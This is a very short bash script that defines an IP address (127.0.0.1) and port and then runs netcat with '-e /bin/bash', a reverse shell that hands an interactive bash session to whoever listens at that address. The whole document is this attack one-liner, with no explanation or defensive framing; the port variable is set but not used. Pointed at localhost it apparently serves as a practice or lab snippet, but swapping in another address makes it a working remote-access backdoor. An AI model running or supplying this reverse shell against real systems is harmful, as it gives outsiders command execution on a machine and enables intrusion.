#!/bin/bash

port="5050"
ip="127.0.0.1"

nc -v "$ip" 5050 -e /bin/bash
